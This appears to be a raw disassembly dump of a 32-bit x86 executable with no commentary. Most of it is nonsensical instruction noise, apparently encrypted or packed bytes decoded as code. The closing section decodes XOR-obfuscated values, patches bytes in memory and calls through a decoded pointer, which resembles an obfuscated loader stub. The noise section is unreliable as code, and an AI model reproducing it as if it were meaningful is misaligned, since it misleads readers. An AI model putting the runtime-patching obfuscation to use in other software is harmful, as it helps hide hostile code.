  4030cf:	rcr    DWORD PTR [edi+eiz*4+0x6c33582a],1
  4030d6:	fistp  QWORD PTR [edi-0x79b8ffec]
  4030dc:	pop    es
  4030dd:	push   eax
  4030de:	mov    ah,0x61
  4030e0:	mov    ebx,0x6e3c3015
  4030e5:	leave  
  4030e6:	pushf  
  4030e7:	and    esi,DWORD PTR [ebp-0x6f4b33ab]
  4030ed:	rcr    BYTE PTR [ecx+0x50],1
  4030f0:	test   al,0x37
  4030f2:	sub    edx,DWORD PTR [edx]
  4030f4:	pop    esi
  4030f5:	fadd   DWORD PTR [ecx-0x2df7e]
  4030fb:	fisttp WORD PTR [eax+0x50]
  4030fe:	dec    ebx
  4030ff:	je     0x4030c9
  403101:	sbb    al,bh
  403103:	pop    ebx
  403104:	jne    0x403143
  403106:	xor    ebp,eax
  403108:	lea    ecx,[edx+0x4e]
  40310b:	adc    bl,BYTE PTR [ebp+0x2a371e3]
  403111:	xor    eax,0x224e86b1
  403116:	push   ecx
  403117:	cmp    DWORD PTR ds:0xefc910e6,ebp
  40311d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40311e:	shl    bl,1
  403120:	mov    BYTE PTR [ecx],dl
  403122:	jmp    0xf78df925
  403127:	xor    DWORD PTR [esp+ebp*4-0x35],edi
  40312b:	push   esp
  40312c:	hlt    
  40312d:	sub    DWORD PTR [edi-0x18112544],ecx
  403133:	push   ebp
  403134:	xor    ebp,ecx
  403136:	mov    edi,0xd85c7001
  40313b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40313c:	push   edi
  40313d:	mov    es,esi
  40313f:	add    ebp,ecx
  403141:	sahf   
  403142:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  403144:	inc    eax
  403145:	mov    ecx,0x311464e4
  40314a:	dec    esi
  40314b:	aad    0x4f
  40314d:	lahf   
  40314e:	xchg   DWORD PTR [edi],esi
  403150:	jno    0x4030f7
  403152:	add    ch,BYTE PTR [eax]
  403154:	ret    0x1f2
  403157:	sbb    bh,ch
  403159:	int    0x8d
  40315b:	or     al,0xcf
  40315d:	rcr    DWORD PTR [esi+0x7c],1
  403160:	jmp    0xd46fefb0
  403165:	test   DWORD PTR [ebx-0x1],0x7bb814bd
  40316c:	(bad)  
  40316d:	pop    edi
  40316e:	adc    ebx,edx
  403170:	shl    ebx,0xc1
  403173:	ss icebp 
  403175:	pop    esi
  403176:	mov    al,ds:0x834764d4
  40317b:	adc    BYTE PTR [edi+0x53787b57],bl
  403181:	or     ebx,DWORD PTR [esi-0x60674ce7]
  403187:	dec    esi
  403188:	inc    ebx
  403189:	jne    0x4031a0
  40318b:	pop    edx
  40318c:	cmp    al,0xb4
  40318e:	fnsave [edx]
  403190:	adc    eax,0xc2ff7e1f
  403195:	in     al,0x5
  403197:	fcom   QWORD PTR [edx]
  403199:	ss push esp
  40319b:	mul    BYTE PTR [ebx]
  40319d:	lods   al,BYTE PTR ds:[esi]
  40319e:	loop   0x403217
  4031a0:	pop    ebx
  4031a1:	cdq    
  4031a2:	pop    edi
  4031a3:	xchg   ecx,eax
  4031a4:	ins    BYTE PTR es:[edi],dx
  4031a5:	imul   esi,edx,0x13
  4031a8:	scas   eax,DWORD PTR es:[edi]
  4031a9:	mov    esp,DWORD PTR [esi+0x516d2a80]
  4031af:	adc    DWORD PTR [ebp-0x42],esp
  4031b2:	jne    0x403147
  4031b4:	stc    
  4031b5:	outs   dx,BYTE PTR ds:[esi]
  4031b6:	push   esp
  4031b7:	aas    
  4031b8:	xchg   BYTE PTR [esi],ch
  4031ba:	or     eax,0x51a977ba
  4031bf:	dec    ebp
  4031c0:	lods   al,BYTE PTR ds:[esi]
  4031c1:	cs addr16 cmp ah,ch
  4031c5:	in     eax,dx
  4031c6:	mov    edx,0x8e1e30b
  4031cb:	xor    BYTE PTR [eax-0x627b6c72],al
  4031d1:	push   edi
  4031d2:	add    al,BYTE PTR [eax-0x27]
  4031d5:	pop    esp
  4031d6:	push   eax
  4031d7:	pop    eax
  4031d8:	retf   
  4031d9:	retf   0x2fdc
  4031dc:	in     eax,0x65
  4031de:	aaa    
  4031df:	mov    edi,0xb61f0716
  4031e4:	fiadd  DWORD PTR [ecx+0x44b503da]
  4031ea:	push   eax
  4031eb:	call   0xddd0dc65
  4031f0:	repnz out dx,al
  4031f2:	pop    edi
  4031f3:	mov    al,ds:0xb544458d
  4031f8:	xchg   edx,eax
  4031f9:	arpl   WORD PTR [ebp+0x3247ecba],si
  4031ff:	neg    WORD PTR [ecx+0x42]
  403203:	pushf  
  403204:	and    bl,BYTE PTR [edx]
  403206:	das    
  403207:	inc    esi
  403208:	add    ebx,DWORD PTR [esi+0x78]
  40320b:	dec    ebx
  40320d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40320e:	adc    eax,0xdbf60da4
  403213:	es dec edi
  403215:	clc    
  403216:	pop    ecx
  403217:	outs   dx,DWORD PTR ds:[esi]
  403218:	mov    esp,0xbfe0fc42
  40321d:	mov    DWORD PTR ds:0xe0201547,edx
  403223:	cmp    eax,0x41300288
  403228:	push   es
  403229:	idiv   BYTE PTR [ebx+0x14f76da0]
  40322f:	out    0x8a,al
  403231:	call   0x50b9bb8d
  403236:	stos   BYTE PTR es:[edi],al
  403237:	mov    al,ds:0x6245f985
  40323c:	and    eax,0xd18a8f6b
  403241:	stos   BYTE PTR es:[edi],al
  403242:	xchg   dl,dh
  403244:	inc    esi
  403245:	jns    0x40326e
  403247:	inc    esi
  403248:	imul   BYTE PTR [eax+eiz*2+0x5e]
  40324c:	mov    dh,0x38
  40324e:	xor    BYTE PTR [edx],dl
  403250:	cli    
  403251:	test   BYTE PTR [edx+0x52ece47d],bh
  403257:	push   0x3c77c165
  40325c:	imul   ecx,edx,0xffffffad
  40325f:	mov    eax,0x3391eeb1
  403264:	mov    al,ds:0x4ecff717
  403269:	jp     0x40327a
  40326b:	rcr    BYTE PTR [edx+0x3d],cl
  40326e:	mov    ds:0x18a3d8ec,al
  403273:	bnd jle 0x4032a3
  403276:	push   edx
  403277:	icebp  
  403278:	mov    BYTE PTR [edi+edx*8],bh
  40327b:	xchg   al,bl
  40327d:	sbb    eax,0x61564749
  403282:	sub    dh,BYTE PTR [ebx]
  403284:	lea    ebp,[ecx+0x5e0d9489]
  40328a:	mov    DWORD PTR [ebp-0x3],0x8cccd5ad
  403291:	push   es
  403292:	ret    
  403293:	pop    ecx
  403294:	or     al,0xc3
  403296:	outs   dx,BYTE PTR ds:[esi]
  403297:	push   0x90787d3d
  40329c:	fwait
  40329d:	xchg   ecx,eax
  40329e:	gs test eax,0x7a99ed34
  4032a4:	dec    ebx
  4032a5:	add    dl,BYTE PTR [edi+0x29]
  4032a8:	or     BYTE PTR [esi-0x70],bl
  4032ab:	adc    BYTE PTR [ecx-0x53c33622],ah
  4032b1:	inc    edx
  4032b2:	and    BYTE PTR [esi+0x4],bh
  4032b5:	out    dx,eax
  4032b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032b7:	mov    ah,0xc
  4032b9:	aad    0x37
  4032bb:	mov    bh,0x2e
  4032bd:	adc    dh,0xf2
  4032c0:	xchg   edi,eax
  4032c1:	and    al,0xd
  4032c3:	iret   
  4032c4:	mov    ds:0x2ae8f5c6,eax
  4032c9:	data16 mov ds:0xd5899677,al
  4032cf:	mov    edx,DWORD PTR [esi+0x2e6b924e]
  4032d5:	sar    ebp,1
  4032d7:	mov    ecx,0x395d7c4c
  4032dc:	mov    edi,0x44544703
  4032e1:	rcr    DWORD PTR [esi-0x66b7a1b],cl
  4032e7:	pop    ds
  4032e8:	nop
  4032e9:	xor    eax,0xa1e68848
  4032ee:	jl     0x40328f
  4032f0:	push   0x1
  4032f2:	iret   
  4032f3:	add    eax,DWORD PTR [esi-0x49]
  4032f6:	mov    ecx,gs
  4032f8:	hlt    
  4032f9:	mov    eax,0x93d973ff
  4032fe:	outs   dx,DWORD PTR ds:[esi]
  4032ff:	push   ebp
  403300:	xor    esp,0x9e12eda1
  403306:	bound  esp,QWORD PTR [edx-0x2c7b191c]
  40330c:	and    ebp,DWORD PTR [esi+0x3baedfa7]
  403312:	push   ecx
  403313:	stos   DWORD PTR es:[edi],eax
  403314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403315:	adc    eax,0x77f41311
  40331a:	adc    esp,0xb4da03c4
  403320:	fimul  DWORD PTR [esp+eax*2]
  403323:	mov    dh,0x65
  403325:	jmp    0x6e59ff43
  40332a:	ret    0x1d48
  40332d:	add    al,0x33
  40332f:	stos   DWORD PTR es:[edi],eax
  403330:	xchg   ebp,eax
  403331:	xor    eax,0xa7816541
  403336:	dec    ebp
  403337:	jp     0x4033b5
  403339:	pop    edx
  40333a:	dec    edx
  40333b:	inc    eax
  40333c:	pop    ss
  40333d:	pop    ecx
  40333e:	rol    BYTE PTR [edx-0x2a],0xd8
  403342:	mov    BYTE PTR [edx-0x43],ch
  403345:	cdq    
  403346:	movlps xmm2,QWORD PTR [ecx+0x6b]
  40334a:	mov    ebp,0x4dcd6afb
  40334f:	fsubrp st(0),st
  403351:	xchg   ecx,eax
  403352:	retf   0xbfeb
  403355:	lahf   
  403356:	or     al,0x5a
  403358:	or     eax,0x7ca720d2
  40335d:	pop    edi
  40335e:	scas   al,BYTE PTR es:[edi]
  40335f:	xor    DWORD PTR [esi],edx
  403361:	and    ch,BYTE PTR [esi]
  403363:	inc    ebp
  403364:	sub    DWORD PTR [eax-0x44],ebp
  403367:	bound  ebp,QWORD PTR [edi+0x5b]
  40336a:	or     BYTE PTR [eax+0x4c],al
  40336d:	inc    ebx
  40336e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40336f:	add    BYTE PTR [ebx],al
  403371:	mov    eax,0x8a1b732b
  403376:	or     al,0xee
  403378:	int    0x47
  40337a:	and    ch,ah
  40337c:	mov    al,ds:0x2c9e9f45
  403381:	pop    edi
  403382:	icebp  
  403383:	imul   edx,DWORD PTR [ebp-0x1d],0x22
  403387:	cmp    ecx,ebx
  403389:	enter  0x7446,0xf3
  40338d:	mov    esi,0x80613d38
  403392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403393:	je     0x40332f
  403395:	stos   BYTE PTR es:[edi],al
  403396:	and    eax,0xd7f5552c
  40339b:	cld    
  40339c:	(bad)  
  40339d:	push   DWORD PTR ds:0x15812c24
  4033a4:	retf   
  4033a5:	cdq    
  4033a6:	dec    edx
  4033a7:	jno    0xd358d0ca
  4033ad:	test   al,0x5c
  4033af:	popf   
  4033b0:	xchg   ecx,eax
  4033b1:	cld    
  4033b2:	das    
  4033b3:	pop    eax
  4033b4:	pop    ecx
  4033b5:	imul   esp,esi,0x89753f93
  4033bb:	pop    eax
  4033bc:	retf   
  4033bd:	in     al,dx
  4033be:	outs   dx,DWORD PTR ds:[esi]
  4033bf:	(bad)  
  4033c0:	clc    
  4033c1:	cmp    edx,DWORD PTR ds:[esi-0x37]
  4033c5:	adc    al,0xa2
  4033c7:	icebp  
  4033c8:	or     BYTE PTR [edi+0x1],bh
  4033cb:	pop    esi
  4033cc:	sbb    al,0x3a
  4033ce:	adc    ebp,ecx
  4033d0:	push   ss
  4033d1:	pop    es
  4033d2:	xchg   edi,eax
  4033d3:	popa   
  4033d4:	cmp    ecx,DWORD PTR [edi+eax*1+0x78]
  4033d8:	daa    
  4033d9:	out    0x5e,eax
  4033db:	shl    BYTE PTR [ecx+ecx*1+0x173203d4],1
  4033e2:	sar    DWORD PTR [eax+0x6fe2f14c],1
  4033e8:	std    
  4033e9:	and    BYTE PTR [ebx-0x46],cl
  4033ec:	test   al,0x32
  4033ee:	or     bl,BYTE PTR [ecx+eiz*1]
  4033f1:	jb     0x40346b
  4033f3:	in     eax,dx
  4033f4:	aam    0xde
  4033f6:	(bad)  
  4033f8:	mov    ds:0xe9e660b0,eax
  4033fd:	sahf   
  4033fe:	into   
  4033ff:	idiv   BYTE PTR [ebx]
  403401:	pop    ebx
  403402:	jnp    0x4033c6
  403404:	mov    cl,0xd2
  403406:	sahf   
  403407:	pop    eax
  403408:	jle    0x4033c3
  40340a:	mov    edx,0xc7a24d4a
  40340f:	stos   DWORD PTR es:[edi],eax
  403410:	xchg   DWORD PTR [edi-0x2e471ba0],ebp
  403416:	mov    ebx,ebp
  403418:	mov    ds:0x2b77684b,eax
  40341d:	mov    ah,0x23
  40341f:	(bad)  
  403420:	cli    
  403421:	adc    eax,0x244a1d61
  403426:	lea    ebx,ds:0x52dcffa2
  40342c:	or     dl,BYTE PTR [edx+eax*2]
  40342f:	in     al,0x1
  403431:	leave  
  403432:	xor    DWORD PTR [eax-0xa55fda2],esi
  403438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403439:	sub    eax,DWORD PTR [edi-0x27]
  40343c:	add    eax,0xfe739b42
  403441:	sar    DWORD PTR [esi-0x39],0x3e
  403445:	cmp    dl,BYTE PTR [eax+0x0]
  403448:	sub    al,BYTE PTR [esi-0x39]
  40344b:	cmp    al,0x24
  40344d:	dec    eax
  40344e:	ins    DWORD PTR es:[edi],dx
  40344f:	or     DWORD PTR [ebx+ebx*4],esi
  403452:	aas    
  403453:	jg     0x40342b
  403455:	int    0x1b
  403457:	and    BYTE PTR fs:[ebx-0x4b88c98b],bh
  40345e:	and    DWORD PTR [edx-0x30f9da93],ecx
  403464:	and    BYTE PTR [ecx-0x5a],bl
  403467:	add    ebp,edx
  403469:	mov    dh,BYTE PTR [eax+0x676e2b80]
  40346f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403470:	pop    edx
  403471:	(bad)  
  403472:	repnz push 0xb30b24d6
  403478:	cmc    
  403479:	push   esp
  40347a:	jne    0x4034b3
  40347c:	out    0x40,al
  40347e:	push   0xd48a4a50
  403483:	shl    al,1
  403485:	fadd   DWORD PTR ds:0xfbbcc770
  40348b:	gs jp  0x40347f
  40348e:	xchg   esp,ecx
  403490:	mov    bl,0x0
  403492:	arpl   WORD PTR [eax-0x68],dx
  403495:	sti    
  403496:	push   0x859a24a4
  40349b:	jle    0x403473
  40349d:	push   esi
  40349e:	leave  
  40349f:	or     cl,al
  4034a1:	into   
  4034a2:	mov    dl,0xe8
  4034a4:	imul   ecx,edi,0xffffffb9
  4034a7:	dec    edi
  4034a8:	xchg   esp,eax
  4034a9:	pop    es
  4034aa:	test   BYTE PTR [ebx-0x5f],ah
  4034ad:	scas   al,BYTE PTR es:[edi]
  4034ae:	or     BYTE PTR [ebx-0x56],dh
  4034b1:	mov    eax,ds:0x12203747
  4034b6:	pop    edi
  4034b7:	and    eax,0xdb6122e7
  4034bc:	xchg   BYTE PTR [ecx-0x663c2a6a],al
  4034c2:	test   DWORD PTR [edx+0x1a31c04c],esi
  4034c8:	dec    eax
  4034c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ca:	sbb    BYTE PTR ds:0x51c56fe2,bl
  4034d0:	cmp    ch,bl
  4034d2:	cmp    BYTE PTR [eax+0x63eaccd4],bl
  4034d8:	mov    edi,0x5e211da0
  4034dd:	js     0x403465
  4034df:	sub    ch,BYTE PTR [edx]
  4034e1:	push   ds
  4034e2:	sbb    dh,BYTE PTR [edi-0x1fb8394]
  4034e8:	mov    eax,0x7a938b66
  4034ed:	pop    ecx
  4034ee:	adc    al,BYTE PTR [esp+edx*4+0x68]
  4034f2:	add    eax,0x77b7ab7d
  4034f7:	test   eax,0x5227c9eb
  4034fc:	mov    ds:0x4dff7aa3,eax
  403501:	cwde   
  403502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403503:	mov    esi,0xe01a75ea
  403508:	das    
  403509:	dec    ecx
  40350a:	jmp    0x34e6:0xbb84154a
  403511:	push   0x8b104eba
  403516:	dec    ebp
  403517:	pop    ebx
  403518:	call   0x19e3:0xa8629911
  40351f:	dec    edx
  403520:	loope  0x403521
  403522:	mov    ebx,0x193e9dc4
  403527:	adc    eax,0x1d2e585
  40352c:	xchg   edi,eax
  40352d:	sbb    esp,eax
  40352f:	jae    0x40351d
  403531:	pop    es
  403532:	scas   al,BYTE PTR es:[edi]
  403533:	inc    edi
  403534:	adc    ah,BYTE PTR [esi+0x32]
  403537:	dec    dh
  403539:	(bad)  
  40353b:	and    DWORD PTR [ebx],ebx
  40353d:	iret   
  40353e:	enter  0x5ec4,0xfb
  403542:	test   DWORD PTR [esi],ecx
  403544:	enter  0x57f1,0x93
  403548:	sbb    DWORD PTR [ebx-0x2ee74eb],ecx
  40354e:	imul   DWORD PTR [ebp-0x5e19e787]
  403554:	and    DWORD PTR [esi],esp
  403556:	int    0xc9
  403558:	mov    edx,0x3d1c2c6f
  40355d:	ins    DWORD PTR es:[edi],dx
  40355e:	dec    esp
  40355f:	cmp    dh,BYTE PTR [ecx]
  403561:	push   edi
  403562:	in     eax,0x75
  403564:	clc    
  403565:	cs cmc 
  403567:	je     0x403503
  403569:	ret    
  40356a:	(bad)  
  40356b:	push   cs
  40356c:	outs   dx,BYTE PTR ds:[esi]
  40356d:	jno    0x4035ce
  40356f:	jp     0x40357e
  403571:	xor    BYTE PTR fs:[eax+0xf],al
  403575:	ret    0x9aa4
  403578:	fs pop edx
  40357a:	jmp    0x25d2fe81
  40357f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403580:	mov    esi,0x46a269e8
  403585:	cmp    cl,ah
  403587:	test   eax,0x251124f1
  40358c:	pusha  
  40358d:	shr    bh,1
  40358f:	fs or  eax,0x11b3634a
  403595:	mov    cl,0xd5
  403597:	cmp    BYTE PTR [esi],cl
  403599:	lods   eax,DWORD PTR cs:[esi]
  40359b:	jmp    0x4035fe
  40359d:	daa    
  40359e:	jmp    0x3a405c5e
  4035a3:	mov    DWORD PTR [edi+0x8eb9dcc],ecx
  4035a9:	dec    ebp
  4035aa:	mov    eax,0xdb35c294
  4035af:	shr    DWORD PTR [ecx+0x53652a04],1
  4035b5:	repnz push ecx
  4035b7:	push   cs
  4035b8:	adc    BYTE PTR [edx+edx*2+0x54],ah
  4035bc:	fstp   TBYTE PTR [edi+0x1]
  4035bf:	in     eax,dx
  4035c0:	test   DWORD PTR [ebp+0x70],esi
  4035c3:	mov    esp,0x612eead5
  4035c8:	mov    esi,0x71fa5baa
  4035cd:	mov    BYTE PTR [esi],bl
  4035cf:	shl    BYTE PTR [ebx+0x49a09adf],0xbb
  4035d6:	jnp    0x40358a
  4035d8:	xchg   esi,eax
  4035d9:	mov    DWORD PTR [esi+0x7af3419],eax
  4035df:	lahf   
  4035e0:	push   ds
  4035e1:	push   esp
  4035e2:	iret   
  4035e3:	ret    
  4035e4:	mov    ds:0xbdc31a4e,al
  4035e9:	loope  0x403585
  4035eb:	mov    bh,0xdb
  4035ed:	out    0x6a,eax
  4035ef:	sbb    ah,BYTE PTR [ebx]
  4035f1:	outs   dx,BYTE PTR ds:[esi]
  4035f2:	mov    ds:0x1e0dafdb,eax
  4035f7:	inc    esp
  4035f8:	mov    ah,0x54
  4035fa:	int3   
  4035fb:	and    cl,ch
  4035fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035fe:	fdiv   QWORD PTR [esi+eax*8]
  403601:	inc    esi
  403602:	ret    0x9c86
  403605:	or     al,0x30
  403607:	push   0xffffffba
  403609:	mov    ebx,DWORD PTR [ebp-0x80]
  40360c:	xor    eax,eax
  40360e:	test   al,0x2
  403610:	(bad)  
  403611:	jg     0x4035e4
  403613:	sub    al,0x25
  403615:	mov    bh,0x53
  403617:	shr    BYTE PTR [esi+0x49],1
  40361a:	dec    ebp
  40361b:	in     al,0xc3
  40361d:	aas    
  40361e:	mov    ds:0x7fab4914,eax
  403623:	sbb    esp,ebx
  403625:	dec    edx
  403626:	sub    BYTE PTR [edi+0x177e708f],0xf0
  40362d:	aam    0xde
  40362f:	xchg   edx,eax
  403630:	rcr    DWORD PTR [ebp+0x14],1
  403633:	dec    ebx
  403634:	pop    ebp
  403635:	xchg   edi,eax
  403636:	xchg   edx,eax
  403637:	and    cl,bl
  403639:	shl    DWORD PTR [ebx-0x7a],0x1e
  40363d:	push   ecx
  40363e:	dec    esp
  40363f:	repz loopne 0x403625
  403642:	sub    al,0xad
  403644:	xchg   BYTE PTR [ecx-0x3dc68dad],bh
  40364a:	xchg   edi,eax
  40364b:	xchg   edx,eax
  40364c:	fwait
  40364d:	push   0x23d0883d
  403652:	dec    esi
  403653:	mov    dl,0x51
  403655:	push   ebx
  403656:	cmp    edi,DWORD PTR [ebx-0x4c718c67]
  40365c:	or     bh,BYTE PTR [ebp-0x6f]
  40365f:	sbb    BYTE PTR [eax+0x5583d1c9],al
  403665:	(bad)  
  403666:	(bad)  [edi+0x29471753]
  40366c:	push   ebp
  40366d:	and    eax,0xa32363bc
  403672:	mov    dl,0xf
  403674:	sar    bh,1
  403676:	pop    ebx
  403677:	or     ebp,DWORD PTR [ebp+0x2e]
  40367a:	ins    DWORD PTR es:[edi],dx
  40367b:	popf   
  40367c:	dec    esp
  40367d:	stos   BYTE PTR es:[edi],al
  40367e:	int    0xe1
  403680:	cmp    ecx,DWORD PTR [eax]
  403682:	int3   
  403683:	and    al,0xea
  403685:	imul   ecx,edi,0x5b
  403688:	cmp    ch,BYTE PTR [eax+esi*2+0x6f3d91c2]
  40368f:	mov    al,0x67
  403691:	rcl    DWORD PTR ds:0x435025a6,0xef
  403698:	retf   0xbdb
  40369b:	xor    DWORD PTR [ebp-0x12],ebp
  40369e:	mov    eax,ds:0x2577cee
  4036a3:	xor    al,0x13
  4036a5:	ret    
  4036a6:	nop
  4036a7:	cld    
  4036a8:	mov    ds:0x608b4f6,eax
  4036ad:	int3   
  4036ae:	sbb    DWORD PTR [edx+edx*1-0x12],0x632a6bd4
  4036b6:	repz jne 0x4036de
  4036b9:	inc    ebp
  4036ba:	mov    ch,BYTE PTR [esi-0x72]
  4036bd:	push   es
  4036be:	cdq    
  4036bf:	cmp    cl,BYTE PTR [eax+0x639684de]
  4036c5:	das    
  4036c6:	or     al,dl
  4036c8:	mov    eax,ds:0xcbcd36c4
  4036cd:	mov    bl,0xdf
  4036cf:	mov    ?,WORD PTR [edx-0x41]
  4036d2:	repz ja 0x403676
  4036d5:	push   ebx
  4036d6:	jbe    0x4036bc
  4036d8:	shl    eax,1
  4036da:	mov    ebp,0x13d8a2cb
  4036df:	test   BYTE PTR [eax+0x6c9de7ea],dl
  4036e5:	fnstcw WORD PTR [ebx+0x72792981]
  4036eb:	xchg   DWORD PTR [esi+0x299df7e],edi
  4036f1:	test   BYTE PTR [eax+esi*4-0x5c],dl
  4036f5:	and    al,0xcc
  4036f7:	cmp    bh,ah
  4036f9:	pop    es
  4036fa:	sub    ebp,edi
  4036fc:	pop    esp
  4036fd:	ins    DWORD PTR es:[edi],dx
  4036fe:	mov    ch,0xed
  403700:	ins    BYTE PTR es:[edi],dx
  403701:	(bad)  
  403702:	iret   
  403703:	inc    ecx
  403704:	xchg   ebp,eax
  403705:	jp     0x403706
  403707:	cwde   
  403708:	rcl    ebx,0xae
  40370b:	cmp    DWORD PTR [esi],0x71
  40370e:	clc    
  40370f:	and    ecx,DWORD PTR [eax*2+0x6b15e820]
  403716:	retf   
  403717:	shl    BYTE PTR [ebx-0x6e7baeff],0xf5
  40371e:	mov    bl,0x2f
  403720:	mov    bl,0x7b
  403722:	mov    ch,0x3e
  403724:	jmp    0x702e:0x33f6e703
  40372b:	cmp    dh,BYTE PTR [esi+0x1]
  40372e:	mov    cl,0xe
  403730:	rcl    DWORD PTR [edi+0x76f257eb],0xd0
  403737:	inc    esp
  403738:	adc    edi,DWORD PTR [esi-0x2a8d762b]
  40373e:	loopne 0x4036e3
  403740:	lahf   
  403741:	fisubr WORD PTR [esi+esi*2]
  403744:	cmp    BYTE PTR [edi-0xd4fcac0],cl
  40374a:	fcomip st,st(6)
  40374c:	(bad)  
  40374d:	ror    dl,1
  40374f:	shr    al,cl
  403751:	int    0xa7
  403753:	jmp    0x4037c9
  403755:	mov    edx,0x2f4c85a3
  40375a:	dec    edx
  40375b:	mov    DWORD PTR [edx-0x6d],eax
  40375e:	jo     0x4036e4
  403760:	lds    ebp,FWORD PTR [edi-0x6c]
  403763:	ror    dh,0x2e
  403766:	ss mov al,0x57
  403769:	add    edx,DWORD PTR [eax+0x477272b0]
  40376f:	jmp    0x40378b
  403771:	and    DWORD PTR [ecx-0x5bf6f856],ecx
  403777:	adc    dl,dl
  403779:	data16 sbb al,0x7
  40377c:	cmp    eax,0x44c4c80b
  403781:	mov    ds:0x1c93b93a,eax
  403786:	mov    edi,0x84e3d02f
  40378b:	sbb    esp,esi
  40378d:	jmp    0x40374f
  40378f:	or     DWORD PTR [ecx-0x42b44f04],ebx
  403795:	sbb    ch,BYTE PTR [esi-0x4d]
  403798:	push   cs
  403799:	and    eax,0x8bb84589
  40379e:	inc    ebp
  40379f:	in     al,dx
  4037a0:	xor    eax,esi
  4037a2:	add    eax,edi
  4037a4:	push   eax
  4037a5:	mov    eax,DWORD PTR [ebp-0x1c]
  4037a8:	xor    eax,esi
  4037aa:	add    eax,edi
  4037ac:	push   eax
  4037ad:	mov    eax,DWORD PTR [ebp-0x10]
  4037b0:	xor    eax,esi
  4037b2:	add    eax,edi
  4037b4:	push   eax
  4037b5:	lea    eax,[ebp-0x90]
  4037bb:	push   eax
  4037bc:	push   DWORD PTR [ebp-0x20]
  4037bf:	push   DWORD PTR [ebp-0x3c]
  4037c2:	call   0x40b2f1
  4037c7:	test   eax,eax
  4037c9:	je     0x4037fa
  4037cf:	lea    eax,[ebp-0x90]
  4037d5:	push   eax
  4037d6:	mov    eax,DWORD PTR [ebp-0x3c]
  4037d9:	xor    eax,esi
  4037db:	add    eax,edi
  4037dd:	push   eax
  4037de:	mov    eax,DWORD PTR [ebp-0x2c]
  4037e1:	add    eax,0xaa
  4037e6:	push   eax
  4037e7:	mov    eax,DWORD PTR [ebp-0x2c]
  4037ea:	mov    eax,DWORD PTR [eax+0x198]
  4037f0:	push   DWORD PTR [eax]
  4037f2:	call   0x4038a9
  4037f7:	mov    DWORD PTR [ebp-0x38],eax
  4037fa:	lea    eax,[ebp+0x4]
  4037fd:	mov    DWORD PTR [ebp-0x40],eax
  403800:	mov    eax,DWORD PTR [ebp-0xc]
  403803:	mov    eax,DWORD PTR [eax]
  403805:	mov    eax,DWORD PTR [eax]
  403807:	mov    eax,DWORD PTR [eax]
  403809:	test   eax,eax
  40380b:	je     0x40389a
  403811:	lea    eax,[ebp-0x8]
  403814:	mov    DWORD PTR [ebp-0x4c],eax
  403817:	mov    eax,DWORD PTR [ebp-0x44]
  40381a:	mov    DWORD PTR [ebp-0x8],eax
  40381d:	mov    eax,DWORD PTR [ebp-0xc]
  403820:	mov    eax,DWORD PTR [eax]
  403822:	mov    eax,DWORD PTR [eax]
  403824:	mov    eax,DWORD PTR [eax]
  403826:	sub    DWORD PTR [ebp-0x8],eax
  403829:	mov    ecx,DWORD PTR [ebp-0x10]
  40382c:	xor    ecx,esi
  40382e:	mov    eax,0xffcd8d27
  403833:	sub    eax,ecx
  403835:	add    DWORD PTR [ebp-0x8],eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,DWORD PTR [ebp-0xc]
  40383e:	mov    ecx,DWORD PTR [ecx]
  403840:	mov    ecx,DWORD PTR [ecx]
  403842:	mov    ecx,DWORD PTR [ecx]
  403844:	mov    DWORD PTR [ecx+0x1],eax
  403847:	mov    al,BYTE PTR [ebp-0x1]
  40384a:	mov    ecx,DWORD PTR [ebp-0xc]
  40384d:	mov    ecx,DWORD PTR [ecx]
  40384f:	mov    ecx,DWORD PTR [ecx]
  403851:	mov    ecx,DWORD PTR [ecx]
  403853:	xor    al,0x6e
  403855:	sub    al,0xe
  403857:	mov    BYTE PTR [ecx],al
  403859:	push   eax
  40385a:	xchg   edx,eax
  40385b:	push   ecx
  40385c:	pop    edx
  40385d:	add    edx,ecx
  40385f:	or     eax,0x76576576
  403864:	xor    eax,edx
  403866:	pop    edx
  403867:	push   DWORD PTR [ebp-0x2c]
  40386a:	mov    eax,ds:0x41c3cf
  40386f:	push   DWORD PTR [eax]
  403871:	push   DWORD PTR ds:0x41c62b
  403877:	push   DWORD PTR ds:0x41c3d7
  40387d:	push   DWORD PTR ds:0x41c60b
  403883:	push   DWORD PTR ds:0x41c6a3
  403889:	push   DWORD PTR [ebp-0x3c]
  40388c:	push   DWORD PTR [ebp-0x20]
  40388f:	mov    eax,DWORD PTR [ebp-0xc]
  403892:	mov    eax,DWORD PTR [eax]
  403894:	mov    eax,DWORD PTR [eax]
  403896:	mov    eax,DWORD PTR [eax]
  403898:	call   eax
  40389a:	mov    eax,DWORD PTR [ebp-0x40]
  40389d:	mov    ecx,DWORD PTR ds:0x41c5cf
  4038a3:	add    DWORD PTR [eax],ecx
  4038a5:	pop    edi
  4038a6:	pop    esi
  4038a7:	leave  
  4038a8:	ret    
  4038a9:	push   ebp
  4038aa:	mov    ebp,esp
  4038ac:	sub    esp,0x38
  4038af:	push   ebx
  4038b0:	or     DWORD PTR ds:0x43001c,0x431008
  4038ba:	push   esi
  4038bb:	mov    DWORD PTR ds:0x431018,0x6764
  4038c5:	push   edi
  4038c6:	sub    DWORD PTR ds:0x43101c,0x431000
  4038d0:	push   0x0
  4038d2:	xor    DWORD PTR ds:0x42f01c,0x434a
  4038dc:	push   0x0
  4038de:	adc    DWORD PTR ds:0x431008,0x18b8
  4038e8:	push   0x41c6bb
  4038ed:	call   DWORD PTR ds:0x42a048
  4038f3:	add    DWORD PTR ds:0x430014,0x42e024
  4038fd:	call   DWORD PTR ds:0x42a010
  403903:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
